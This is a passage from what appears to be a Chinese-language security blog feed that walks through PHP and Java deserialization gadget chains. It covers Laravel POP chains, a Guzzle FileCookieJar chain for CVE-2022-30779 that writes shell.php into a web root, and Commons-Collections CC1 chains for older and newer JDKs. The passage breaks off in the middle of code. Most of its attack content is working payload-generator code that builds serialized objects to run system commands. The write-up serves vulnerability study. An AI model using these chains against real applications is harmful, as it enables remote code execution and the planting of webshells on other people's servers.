&#125;&#125;namespace Illuminate\Contracts\Queue;interface ShouldQueue&#123;&#125;namespace Illuminate\Broadcasting;use Illuminate\Contracts\Queue\ShouldQueue;use Mockery\Generator\MockDefinition;class BroadcastEvent implements ShouldQueue&#123;    public $connection;    public function __construct()    &#123;        $this-&gt;connection=new MockDefinition();    &#125;&#125;namespace Mockery\Loader;class EvalLoader&#123;&#125;namespace Mockery\Generator;class MockDefinition&#123;    protected $config;    protected $code;    public function __construct()    &#123;        $this-&gt;code=&quot;&lt;?php system(&#39;calc&#39;);?&gt;&quot;;        $this-&gt;config=new MockConfiguration();    &#125;&#125;namespace Mockery\Generator;class MockConfiguration&#123;&#125;use  Illuminate\Broadcasting\PendingBroadcast;$a = new PendingBroadcast();echo urlencode(serialize($a));</code></pre><h4 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h4><p>入口点依旧是<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code></p><pre><code class="php">public function __destruct()&#123;   $this-&gt;events-&gt;dispatch($this-&gt;event);&#125;</code></pre><p>这条链子是触发__call这个方向</p><p>这里触发的是<code>vendor/laravel/framework/src/Illuminate/Validation/Validator.php</code></p><pre><code class="php">public function __call($method, $parameters)    &#123;        $rule = Str::snake(substr($method, 8));        if (isset($this-&gt;extensions[$rule])) &#123;            return $this-&gt;callExtension($rule, $parameters);        &#125;        throw new BadMethodCallException(sprintf(            &#39;Method %s::%s does not exist.&#39;, static::class, $method        ));    &#125;</code></pre><p><code>$this-&gt;extensions[$rule]</code>可控，跟进<code>callExtension()</code></p><pre><code class="php">protected function callExtension($rule, $parameters)    &#123;        $callback = $this-&gt;extensions[$rule];        if (is_callable($callback)) &#123;            return call_user_func_array($callback, $parameters);        &#125; elseif (is_string($callback)) &#123;            return $this-&gt;callClassBasedExtension($callback, $parameters);        &#125;    &#125;</code></pre><p>这里可以看到<code> call_user_func_array($callback, $parameters)</code>,两个参数都可控，所以这里是可以任意命令执行的</p><p>需要构造</p><pre><code class="php">$callback = $this-&gt;extensions[$rule] = &quot;system&quot;$this-&gt;event = &quot;calc&quot;</code></pre><p>经过调试发现<code>$rule=&quot;&quot;</code>,所以需要<code>$this-&gt;extensions=[&quot;&quot;=&gt;&quot;system&quot;];</code></p><p>最后的exp:</p><pre><code class="php">&lt;?phpnamespace Illuminate\Broadcasting;use Illuminate\Validation\Validator;class PendingBroadcast&#123;    protected $events;    protected $event;    public function __construct()    &#123;        $this-&gt;events=new Validator();        $this-&gt;event=&quot;calc&quot;;    &#125;&#125;namespace Illuminate\Validation;class Validator&#123;    public $extensions = [];    public function __construct()    &#123;        $this-&gt;extensions=[&quot;&quot;=&gt;&quot;system&quot;];    &#125;&#125;use  Illuminate\Broadcasting\PendingBroadcast;$a = new PendingBroadcast();echo urlencode(serialize($a));</code></pre><h3 id="CVE-2022-30779（-lt-x3D-9-1-8）"><a href="#CVE-2022-30779（-lt-x3D-9-1-8）" class="headerlink" title="CVE-2022-30779（&lt;&#x3D;9.1.8）"></a>CVE-2022-30779（&lt;&#x3D;9.1.8）</h3><p>测试环境是8.x</p><p>入口点在<code>vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code></p><pre><code class="php">public function __destruct()    &#123;        $this-&gt;save($this-&gt;filename);    &#125;</code></pre><p>这个<code>$this-&gt;filename</code>可控，跟进save()</p><pre><code class="php">public function save(string $filename): void    &#123;        $json = [];        /** @var SetCookie $cookie */        foreach ($this as $cookie) &#123;            if (CookieJar::shouldPersist($cookie, $this-&gt;storeSessionCookies)) &#123;                $json[] = $cookie-&gt;toArray();            &#125;        &#125;        $jsonStr = Utils::jsonEncode($json);        if (false === \file_put_contents($filename, $jsonStr, \LOCK_EX)) &#123;            throw new \RuntimeException(&quot;Unable to save file &#123;$filename&#125;&quot;);        &#125;    &#125;</code></pre><p>这个方法存在一个<code>file_put_contents</code>而且<code>$filename</code>可控</p><p>$jsonStr是来自下面这个函数，$this-&gt;data可控</p><pre><code class="php">public function toArray(): array    &#123;        return $this-&gt;data;    &#125;</code></pre><p>跟进CookieJar::shouldPersist让其返回true</p><pre><code class="php">public static function shouldPersist(SetCookie $cookie, bool $allowSessionCookies = false): bool    &#123;        if ($cookie-&gt;getExpires() || $allowSessionCookies) &#123;            if (!$cookie-&gt;getDiscard()) &#123;                return true;            &#125;        &#125;        return false;    &#125;</code></pre><p>其中</p><pre><code class="php">public function getExpires()&#123;  return $this-&gt;data[&#39;Expires&#39;];&#125;public function getDiscard()&#123;   return $this-&gt;data[&#39;Discard&#39;];&#125;</code></pre><p>整个过程都是可控的，说明可以写shell</p><p>POC</p><pre><code class="php">&lt;?phpnamespace GuzzleHttp\Cookie;class FileCookieJar extends CookieJar    &#123;        private $filename;        private $storeSessionCookies;        public function __construct()        &#123;            parent::__construct();            $this-&gt;filename = &quot;shell.php&quot;;            $this-&gt;storeSessionCookies = true;        &#125;    &#125;class CookieJar&#123;        private $cookies = [];        function __construct()        &#123;            $this-&gt;cookies[] = new SetCookie();        &#125;    &#125;class SetCookie&#123;    private $data;    function __construct()    &#123;        $this-&gt;data[&#39;Expires&#39;] = &#39;&lt;?php phpinfo();?&gt;&#39;;        $this-&gt;data[&#39;Discard&#39;] = 0;    &#125;&#125;use GuzzleHttp\Cookie\FileCookieJar;echo urlencode(serialize(new FileCookieJar()));</code></pre><p>在网站根目录生成shell.php，直接访问就行<a href="http://x.x.x.x/shell.php">http://x.x.x.x/shell.php</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230725174600751.png" alt="image-20230725174600751"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collections反序列化链合集</title>
      <link href="/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/"/>
      <url>/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Commons-Collections利用链合集"><a href="#Commons-Collections利用链合集" class="headerlink" title="Commons-Collections利用链合集"></a>Commons-Collections利用链合集</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ol><li><p>java反射</p></li><li><p>javassist</p></li><li><p>动态代理</p></li><li><p>JVM类加载机制</p></li></ol><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>版本：<strong>cc3.1～3.2.1</strong></p><p>jdk: &lt; 8u71</p><p>环境搭建：</p><pre><code class="xml">&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;commons-collections&lt;/groupId&gt;            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;            &lt;version&gt;3.1&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;</code></pre><p>对比官方在3.2.2版本<a href="https://github.com/apache/commons-collections/commit/1642b00d67b96de87cad44223efb9ab5b4fb7be5">https://github.com/apache/commons-collections/commit/1642b00d67b96de87cad44223efb9ab5b4fb7be5</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230727153329622.png" alt="image-20230727153329622"></p><pre><code>默认情况下禁用“InvokerTransformer”的反序列化，因为可用于远程代码执行攻击。 要重新启用具有系统属性“org.apache.commons.collections.invokertransformer.enableDeserialization”需要设置为“true”</code></pre><p>说明漏洞存在于<code>InvokerTransformer</code>这个类</p><p>在这个类里面存在一个<code>transform</code>方法</p><pre><code class="java">public Object transform(Object input) &#123;        if (input == null) &#123;            return null;        &#125; else &#123;            try &#123;                Class cls = input.getClass();                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);                return method.invoke(input, this.iArgs);            &#125; catch (NoSuchMethodException var5) &#123;                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);            &#125; catch (IllegalAccessException var6) &#123;                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);            &#125; catch (InvocationTargetException var7) &#123;                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);            &#125;        &#125;    &#125;</code></pre><p>可以看到这里利用了java反射，可以利用反射调用任意类的任意方法，比如通过反射执行系统命令</p><pre><code class="java">//Runtime.class可序列化，Runtime⽆法序列化Class c =Runtime.class;Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);Runtime r = (Runtime) getRuntime.invoke(null, null);Method exec = c.getMethod(&quot;exec&quot;, String.class);exec.invoke(r,&quot;calc&quot;);</code></pre><p>现在需要知道参数<code>this.iMethodName</code>,<code>this.iParamTypes</code>,<code>this.iArgs</code>是如何传递的</p><p>这个类的构造方法如下：</p><pre><code class="java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;        this.iMethodName = methodName;        this.iParamTypes = paramTypes;        this.iArgs = args;    &#125;</code></pre><p>这三个参数在构造方法中直接赋值，从赋值到反射，没有任何过滤或限制</p><p>可以将上面反射执行系统命令的代码修改为：</p><pre><code class="java">Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></pre><p>然后就是找链子，直到找到readObject()</p><p>找一个调用了transform()的方法<code>org.apache.commons.collections.functors.ChainedTransformer.class#transform()</code></p><pre><code class="java">public Object transform(Object object) &#123;        for (int i = 0; i &lt; iTransformers.length; i++) &#123;            object = iTransformers[i].transform(object);        &#125;        return object;    &#125;</code></pre><p>按顺序调用 Transformer 数组 this.iTransformers 中所有 Transformer 对象的 transform 方法，并且每次调用的结果传递给下一个 Transformer#transform() 作为参数</p><p>利用它我们可以构造 Transformer 数组 通过 ChainedTransformer#transform() 的链式调用机制+java的反射机制在反序列化时构造出 Runtime 对象</p><p>这个类的构造函数：</p><pre><code class="java">public ChainedTransformer(Transformer[] transformers) &#123;        super();        iTransformers = transformers;    &#125;</code></pre><p>然后就可以构造下面代码执行命令了：</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        chainedTransformer.transform(Class.class);</code></pre><p>调用 transform() 方法是参数可控，因为链式调用的起点 为 class对象(Class.class)，是我们传入 transform() 方法的参数。这样条件有些苛刻了，即使参数可控，参数类型也对不上。继续想办法减少条件。</p><p>找到<code>org.apache.commons.collections.functors.ConstantTransformer</code>,看看它是如何实现transform的</p><pre><code class="java">public ConstantTransformer(Object constantToReturn) &#123;        super();        iConstant = constantToReturn;    &#125;public Object transform(Object input) &#123;        return iConstant;    &#125;</code></pre><p>前边使用 ChainedTransformer#transform() 方法链式调用的起点是传入 transform() 方法的参数，也就是 class 对象(Class.class)。可以用 ConstantTransformer 包裹一个 class 对象,把它放到我们构造的 Transformer 数组的首位，作为链式调用的起点。</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        chainedTransformer.transform(&#39;s&#39;);</code></pre><h3 id="lt-8u71"><a href="#lt-8u71" class="headerlink" title="&lt; 8u71"></a>&lt; 8u71</h3><p>找另外一个调用了transform()的方法，这里找到了<code>org/apache/commons/collections/map/LazyMap.java</code>的get()方法</p><pre><code class="java">public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>检查给定的键 <code>key</code> 是否已经存在于 <code>map</code> 中，通过调用 <code>map.containsKey(key)</code> 方法来判断。如果键不存在 (<code>== false</code>)，则进入if语句，调用<code>transform()</code></p><p>其中key是方法参数，可控，然后就是factory,跟踪factory属性的赋值，查看构造函数</p><pre><code class="java">protected LazyMap(Map map, Transformer factory) &#123;        super(map);        if (factory == null) &#123;            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);        &#125;        this.factory = factory;    &#125;</code></pre><p>但是这个类的构造函数是<code>protected</code>类型，只有他自身或者继承他的类可以用,那就是<code>decorate()</code>方法</p><pre><code class="java">public static Map decorate(Map map, Transformer factory) &#123;        return new LazyMap(map, factory);    &#125;</code></pre><p>所以接着上面简单构造一下又能执行命令了</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);        lazymap.get(&#39;s&#39;);</code></pre><p>下一步要找到一个调用get()方法的地方，最好能找到一个重写readObject的类并且在这个readObject里面调用了get的方法</p><p>然后找到了<code>AnnotationInvocationHandler</code>这个类</p><pre><code class="java">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;        ObjectInputStream.GetField var2 = var1.readFields();        Class var3 = (Class)var2.get(&quot;type&quot;, (Object)null);        Map var4 = (Map)var2.get(&quot;memberValues&quot;, (Object)null);        AnnotationType var5 = null;        try &#123;            var5 = AnnotationType.getInstance(var3);        &#125; catch (IllegalArgumentException var13) &#123;            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);        &#125;        Map var6 = var5.memberTypes();        LinkedHashMap var7 = new LinkedHashMap();        String var10;        Object var11;        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;            Map.Entry var9 = (Map.Entry)var8.next();            var10 = (String)var9.getKey();            var11 = null;            Class var12 = (Class)var6.get(var10);            if (var12 != null) &#123;                var11 = var9.getValue();                if (!var12.isInstance(var11) &amp;&amp; !(var11 instanceof ExceptionProxy)) &#123;                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + &quot;[&quot; + var11 + &quot;]&quot;)).setMember((Method)var5.members().get(var10));                &#125;            &#125;        &#125;        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);    &#125;</code></pre><p>AnnotationInvocationHandler 类的 readObject 方法中并没有直接调用到 Map 的 get 方法，但是在 AnnotationInvocationHandler#invoke() 方法调用了 get 方法，this.memberValues 可控。</p><pre><code class="java">public Object invoke(Object var1, Method var2, Object[] var3) &#123;        String var4 = var2.getName();        Class[] var5 = var2.getParameterTypes();        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;            return this.equalsImpl(var3[0]);        &#125; else if (var5.length != 0) &#123;            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);        &#125; else &#123;            switch (var4) &#123;                case &quot;toString&quot;:                    return this.toStringImpl();                case &quot;hashCode&quot;:                    return this.hashCodeImpl();                case &quot;annotationType&quot;:                    return this.type;                default:                    Object var6 = this.memberValues.get(var4);                    if (var6 == null) &#123;                        throw new IncompleteAnnotationException(this.type, var4);                    &#125; else if (var6 instanceof ExceptionProxy) &#123;                        throw ((ExceptionProxy)var6).generateException();                    &#125; else &#123;                        if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) &#123;                            var6 = this.cloneArray(var6);                        &#125;                        return var6;                    &#125;            &#125;        &#125;    &#125;</code></pre><p>这个类的构造方法如下：this.memberValues 可控，设置 this.memberValues 为我们构造的 LazyMap，但是这里存在一个if判断，第一个参数类型必须是注解</p><pre><code class="java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;        Class[] var3 = var1.getInterfaces();        if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;            this.type = var1;            this.memberValues = var2;        &#125; else &#123;            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);        &#125;    &#125;</code></pre><p>下一步就要想如何调用这个<code>invoke</code>方法</p><p>这部分涉及到 java 的动态代理。创建一个 AnnotationInvocationHandler 的代理类，当调用 AnnotationInvocationHandler 的代理类里的任意方法时都会先调用 AnnotationInvocationHandler#invoke() 方法，有点像php里的 _call() 只不过 _call() 在调用不存在的方法才触发</p><p>动态代理参考：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</a></p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        //实例一个 AnnotationInvocationHandler 类        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);//获取指定参数类型的构造函数        construct.setAccessible(true);        //这里第一个参数必须是注释类型的        InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazymap);        // 创建 AnnotationInvocationHandler 的代理        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);        //调用代理对象的任意方法        proxyMap.size();</code></pre><p>这里可以调用任意方法触发，只要找到一个readObject有对我们的代理对象调用任意方法就行，按照ysoserial中的链子，后面使用的是AnnotationInvocationHandler的readObject方法</p><p>(这里懵逼了)这里需要再实例化一个AnnotationInvocationHandler 包裹的代理对象 proxyMap</p><pre><code class="java">handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);</code></pre><p>链子如下：</p><pre class="mermaid">graph TBsun.reflect.annotation.AnnotationInvocationHandler#\nreadObject-->sun.reflect.annotation.AnnotationInvocationHandler#\ninvokesun.reflect.annotation.AnnotationInvocationHandler#\ninvoke-->org.apache.commons.collections.map.LazyMap#\ngetorg.apache.commons.collections.map.LazyMap#\nget-->org.apache.commons.collections.functors.ChainedTransformer#\ntransformorg.apache.commons.collections.functors.ChainedTransformer#\ntransform-->org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransformorg.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform-->Runtime.getRuntime.exec</pre><p>最后的POC</p><pre><code class="java">package TTT;import java.io.*;import java.lang.annotation.Repeatable;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;public class cc1 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        //实例一个 AnnotationInvocationHandler 类        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);//获取指定参数类型的构造函数        construct.setAccessible(true);        //这里第一个参数必须是注释类型的        InvocationHandler handler = (InvocationHandler) construct.newInstance(Repeatable.class, lazymap);        // 创建 AnnotationInvocationHandler 的代理        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);        //调用代理对象的任意方法//        proxyMap.size();        // 再实例化一个 AnnotationInvocationHandler 包裹的代理对象 proxyMap        handler = (InvocationHandler) construct.newInstance(Repeatable.class, proxyMap);        serialize(handler);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;</code></pre><h3 id="gt-8u71"><a href="#gt-8u71" class="headerlink" title="&gt; 8u71"></a>&gt; 8u71</h3><p>在java 8u71以后，AnnotationInvocationHandler的readObject的逻辑变化了，利用不了，所以我们如果想要在高版本执行，必须要找一条新的链</p><p>调用get()方法之前的代码是一样的：</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);        lazymap.get(&#39;s&#39;);</code></pre><p>上面是使用了<code>AnnotationInvocationHandler#invoke()</code>里面调用了<code>get()</code></p><p>这条链使用的是org.apache.commons.collections.keyvalue.TiedMapEntry的<code>getValue</code></p><pre><code class="java">public TiedMapEntry(Map map, Object key) &#123;        super();        this.map = map;        this.key = key;    &#125;public Object getValue() &#123;        return map.get(key);    &#125;</code></pre><p>下一步找调用了<code>getValue()</code>的地方</p><p>就在这个类下就有：</p><pre><code class="java">public int hashCode() &#123;        Object value = getValue();        return (getKey() == null ? 0 : getKey().hashCode()) ^               (value == null ? 0 : value.hashCode());     &#125;</code></pre><p>修改poc:</p><pre><code class="java">ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);        tiedmapentry.hashCode();</code></pre><p>如何调用<code>hashCode()</code></p><p>在<code>java.util.HashMap</code>, 可以构造<code>hash(tiedmapentry)</code></p><pre><code class="java">static final int hash(Object key) &#123;        int h;        return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);    &#125;</code></pre><p>但是hash方法不是public类型，只能内部调用</p><p>在内部找到<code>readObject</code>,刚好可以结束链子</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)        throws IOException, ClassNotFoundException &#123;....for (int i = 0; i &lt; mappings; i++) &#123;                @SuppressWarnings(&quot;unchecked&quot;)                    K key = (K) s.readObject();                @SuppressWarnings(&quot;unchecked&quot;)                    V value = (V) s.readObject();                putVal(hash(key), key, value, false, false);            &#125;&#125;</code></pre><p>key的来源是map对象</p><p>链子如下:</p><pre class="mermaid">graph TBjava.util.HashMap#\nreadObject-->java.util.HashMap#\nhashjava.util.HashMap#\nhash-->org.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCodeorg.apache.commons.collections.keyvalue.TiedMapEntry#\nhashCode-->org.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValueorg.apache.commons.collections.keyvalue.TiedMapEntry#\ngetValue-->org.apache.commons.collections.map.LazyMap#\ngetorg.apache.commons.collections.map.LazyMap#\nget-->org.apache.commons.collections.functors.ChainedTransformer#\ntransformorg.apache.commons.collections.functors.ChainedTransformer#\ntransform-->org.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransformorg.apache.commons.collections.functors.InvokerTransformer#\ntransform\n和\norg.apache.commons.collections.functors.ConstantTransformer#\ntransform-->Runtime.getRuntime.exec</pre><p>最后的POC</p><pre><code class="java">package TTT;import java.io.*;import java.lang.annotation.Repeatable;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import java.util.HashMap;public class cc1 &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Class.class),                new InvokerTransformer(                        &quot;forName&quot;,                        new Class[] &#123;String.class&#125;,                        new Object[] &#123;&quot;java.lang.Runtime&quot;&#125;                ),                new InvokerTransformer(                        &quot;getMethod&quot;,                        new Class[] &#123;String.class,Class[].class&#125;,                        new Object[] &#123;&quot;getRuntime&quot;,new Class[0]&#125;                ),                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        null, new Object[0] &#125;),                new InvokerTransformer(                        &quot;exec&quot;,                        new Class[] &#123;String.class&#125;,                        new String[]&#123;&quot;calc&quot;&#125;                )        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);//        chainedTransformer.transform(&#39;s&#39;);        Map map = new HashMap&lt;&gt;();        Map lazymap = LazyMap.decorate(map,chainedTransformer);//        lazymap.get(&#39;s&#39;);        TiedMapEntry tiedmapentry= new TiedMapEntry(lazymap,&quot;abc&quot;);//        tiedmapentry.hashCode();        Map expMap=new HashMap();        